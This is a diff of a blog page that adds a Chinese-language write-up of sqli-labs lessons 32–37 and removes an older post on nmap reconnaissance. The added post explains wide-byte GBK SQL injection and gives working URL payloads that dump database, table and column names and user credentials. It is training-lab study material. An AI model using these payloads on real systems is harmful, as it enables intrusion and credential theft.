@@ -64,6 +64,88 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-lesson32-37" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/06/lesson32-37/" class="article-date">
+  <time datetime="2021-02-06T05:17:38.000Z" itemprop="datePublished">2021-02-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/06/lesson32-37/">lesson32-37</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="background——宽字节注入："><a href="#background——宽字节注入：" class="headerlink" title="background——宽字节注入："></a>background——宽字节注入：</h1><ul>
+<li><strong>原理：</strong>mysql在使用GBK编码的时候，会认为两个字符（前一个字符的ascii码必须大于128才能到汉字的范围）。）为一个汉字，例如%aa%5c就是一个汉字。</li>
+<li>以lesson32为例，查看源码发现PHP会对<code>\（反斜杠）</code>,<code>&#39;（单引号）</code>,<code>&quot;（双引号）</code>做转义处理</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote <span class="keyword">with</span> a backslash</span><br><span class="line">    $<span class="keyword">string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return $string;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// take the variables </span></span><br><span class="line"><span class="string">if(isset($_GET[&#x27;id&#x27;]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">$id=check_addslashes($_GET[&#x27;id&#x27;]);</span></span><br><span class="line"><span class="string">//echo &quot;</span>The filtered request <span class="keyword">is</span> :<span class="string">&quot; .$id . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="string">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">fclose($fp);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// connectivity </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql_query(&quot;</span><span class="keyword">SET</span> <span class="keyword">NAMES</span> gbk<span class="string">&quot;);</span></span><br><span class="line"><span class="string">$sql=&quot;</span><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$result=mysql_query($sql);</span></span><br><span class="line"><span class="string">//!对于源码的解读：我认为24-26行的命令目的是将sql语句用gbk编码，以防带入数据库后乱码。</span></span><br><span class="line"><span class="string">$row = mysql_fetch_array($result);</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们利用它会将sql语句转为gbk编码，通过吞并<code>\（url编码%5c）</code>的方式绕开其对单引号的转义。例如：%aa%5c，这在gbk编译后成为一个汉字。（gbk编码表<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php%EF%BC%89%E6%AF%94%E5%A6%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php）比如</a> <code>乗</code> 字符，GBK编码 %81%5C</p>
+<p><strong>补充：</strong>有些符号（<code>#</code> <code>$</code> <code>^</code> <code>&amp;</code> <code>* </code> <code>+</code> =）在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了。编码的格式为：%加字符的ASCII码，即一个百分号%，后面跟对应字符的ASCII（16进制）码值。（URL编码就是在uft-8编码的基础上，给编码的每个字节加上百分号。）</p>
+<h2 id="lesson32："><a href="#lesson32：" class="headerlink" title="lesson32："></a>lesson32：</h2><h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>
+
+<p>注：爆表本应该是?id=%aa’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<p>但是因为PHP对<code>&#39;</code>转义，那么我们可以用十六进制来表示security</p>
+<h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(username,0x2c,password) from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="lesson33："><a href="#lesson33：" class="headerlink" title="lesson33："></a>lesson33：</h2><p>和lesson32一模一样。</p>
+<h2 id="lesson34："><a href="#lesson34：" class="headerlink" title="lesson34："></a>lesson34：</h2><p>这关我还以为会和之前两关一样，只不过改为post类型，结果发现了一些不同。</p>
+<p>当我在username输入admin%aa’ union select 1,database()#，登入失败，按理来说不应该呀。于是我用burpsuite抓包：</p>
+<p><img src="/lesson32/1.png" alt="1"></p>
+<p>我们明明输入的uname=admin%aa’ union select 1,database()#，可是我们看到多了一个<code>25</code>在%aa中间，这是什么情况呢？<strong>原来，get与post提交数据类型不同，get型如果输入符合url的格式那么就直接以url形式提交，也就是说遇到%aa这种直接当做url编码处理，而post型却不是这样，他会把你提交的%aa当做正常数据，然后进行url编码，于是就变成了%25aa。</strong></p>
+<ul>
+<li><p>那么我们要怎么避免这个问题呢?</p>
+</li>
+<li><p>我们可以用burp抓包，手动去掉<code>25</code></p>
+</li>
+</ul>
+<p><strong>补充：不同类型编码</strong></p>
+<p>UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。<br>UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节<br>Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。</p>
+<p>—）我们还可以用另外一种方式：?id=牛’ or 1=1#    </p>
+<p><img src="/lesson32/2.png" alt="2"></p>
+<p>在经过url编码后，<code>牛</code>被编码成三个字节加上单引号一个字节，再加上单引号被转义后反斜杠一个字节，总共五个字节，我们已经知道gbk编码时两个字节为一汉字，那么这样转义单引号用的反斜杠被合并，单引号“逃逸”成功。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/Unicode-UTF.php%E5%9C%A8%E7%BA%BFUnicode%E5%92%8CUTF%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E7%BD%91%E5%9D%80">https://www.qqxiuzi.cn/bianma/Unicode-UTF.php在线Unicode和UTF编码转换网址</a></li>
+</ul>
+<h2 id="lesson35："><a href="#lesson35：" class="headerlink" title="lesson35："></a>lesson35：</h2><p>没营养</p>
+<h2 id="lesson36："><a href="#lesson36：" class="headerlink" title="lesson36："></a>lesson36：</h2><p>和lesson32一样，只不过把过滤函数改成mysql_real_escape_string（）。</p>
+<h2 id="lesson37："><a href="#lesson37：" class="headerlink" title="lesson37："></a>lesson37：</h2><p>和lesson34一样，只不过把过滤函数改成mysql_real_escape_string（）。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/06/lesson32-37/" data-id="ckr0oba3c002qi8vu0g310trp" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-lesson29-31" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/05/lesson29-31/" class="article-date">
@@ -716,67 +798,6 @@
 
 
   
-    <article id="blog-2021-1月web渗透培训(1)" class="article article-type-blog" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/" class="article-date">
-  <time datetime="2021-01-27T02:56:06.000Z" itemprop="datePublished">2021-01-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/">2021.1月web渗透培训</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="web渗透的宏观思路："><a href="#web渗透的宏观思路：" class="headerlink" title="web渗透的宏观思路："></a>web渗透的宏观思路：</h3><h5 id="a-信息收集"><a href="#a-信息收集" class="headerlink" title="a.信息收集"></a>a.信息收集</h5><h5 id="b-漏洞挖掘"><a href="#b-漏洞挖掘" class="headerlink" title="b.漏洞挖掘"></a>b.漏洞挖掘</h5><h5 id="c-漏洞利用"><a href="#c-漏洞利用" class="headerlink" title="c.漏洞利用"></a>c.漏洞利用</h5><h5 id="d-输出渗透测试报告"><a href="#d-输出渗透测试报告" class="headerlink" title="d.输出渗透测试报告"></a>d.输出渗透测试报告</h5><h4 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h4><p>1.基本信息：</p>
-<p>《域名信息，子域名，ip地址，同IP的其他网站信息–站长之家；</p>
-<p>​    获取子域名–子域名挖掘机</p>
-<p>​    获取域名或IP地址–<a target="_blank" rel="noopener" href="http://viewdns.info、https//www.dnsdb.io">http://viewdns.info、https://www.dnsdb.io</a></p>
-<p>​    根据IP地址查询同一IP地址的其他信息–<a target="_blank" rel="noopener" href="http://114best.com/ip/114.aspx?w=">http://114best.com/ip/114.aspx?w=</a></p>
-<p>《端口：80（http）443（HTTPS） 445（共享文件夹）；</p>
-<p>《服务（web版本），服务版本；</p>
-<p>2.os操作系统版本：</p>
-<p>linux，wind，mac</p>
-<p>3.web中间件（web程序，用来提供网页服务）</p>
-<p>Apache（主流），iis，Nginx，weblogic</p>
-<p>4.数据库</p>
-<p>类型、版本：mysql，mssql，oracle，access</p>
-<p>5.服务器后端的脚本类型、版本</p>
-<p>PHP、JSP、ASP</p>
-<h5 id="端口扫描技术–NMAP"><a href="#端口扫描技术–NMAP" class="headerlink" title="~端口扫描技术–NMAP"></a>~端口扫描技术–NMAP</h5><p>基本命令格式：nmap -参数 ip/ip段/主机地址</p>
-<h6 id="Nmap-TCP扫描端口选项"><a href="#Nmap-TCP扫描端口选项" class="headerlink" title="Nmap TCP扫描端口选项:"></a>Nmap TCP扫描端口选项:</h6><p>-sP：用ping的方式判断是否有存活主机,不扫描端口。<br>-sT：使用TCP连接扫描，对目标主机所有端口进行完整的三次握手，如果成功建立连接则端口是开放的。<br>-sS：使用半开连接（SYN stealth)扫描，使用SYN标记位的数据包进行端口探测，收到SYN/ACK包则端口是开放的，收到RST/ACK包则端口是关闭的。<br>-sA：TCP ACK扫描使用ACK标志位数据包，若目标主机回复RST数据包，则目标端口没有被过滤（用于发现防<br>火墙的过滤规则)。</p>
-<h6 id="Nmap-UDP扫描端口选项"><a href="#Nmap-UDP扫描端口选项" class="headerlink" title="Nmap UDP扫描端口选项:"></a>Nmap UDP扫描端口选项:</h6><p>-sU使用UDP数据包经行扫描，返回UDP报文，则端口是开放的;返回不可达则端口处于关闭或过滤状态。</p>
-<h6 id="Nmap目标端口选项"><a href="#Nmap目标端口选项" class="headerlink" title="Nmap目标端口选项:"></a>Nmap目标端口选项:</h6><p>-p：扫描指定的端口<br>-F：快速扫描100个常用的端口<br>-r：顺序扫描，按从小到大的顺序进行端口扫描</p>
-<h6 id="Nmap输出选项"><a href="#Nmap输出选项" class="headerlink" title="Nmap输出选项:"></a>Nmap输出选项:</h6><p>-oN：标准输出为指定的文件<br>-oX：生成XML格式文件可以转换成HTML文件</p>
-<h6 id="其他常用选项"><a href="#其他常用选项" class="headerlink" title="其他常用选项:"></a>其他常用选项:</h6><p>-sV：检测服务端软件版本信息<br>-O：检测操作系统信息<br>-Pn：禁用nmap的主机检测功能<br>-A：探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p>
-<p>注：nmap -sP ip段可检测该网段下所有存活的主机</p>
-<p>本章参考ppt：<a target="_blank" rel="noopener" href="https://kdocs.cn/l/ctOPJlaBJgUw">https://kdocs.cn/l/ctOPJlaBJgUw</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/27/2021-1%E6%9C%88web%E6%B8%97%E9%80%8F%E5%9F%B9%E8%AE%AD(1)/" data-id="ckr0oba260001i8vu1axfeyta" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -827,6 +848,10 @@
       <ul>
         
           <li>
+            <a href="/2021/07/20/buuctf10/">buuctf10</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/19/buuctf9/">buuctf9</a>
           </li>
         
@@ -840,10 +865,6 @@
         
           <li>
             <a href="/2021/07/14/buuctf6/">buuctf6</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/">攻防世界web进阶</a>
           </li>
         
       </ul>
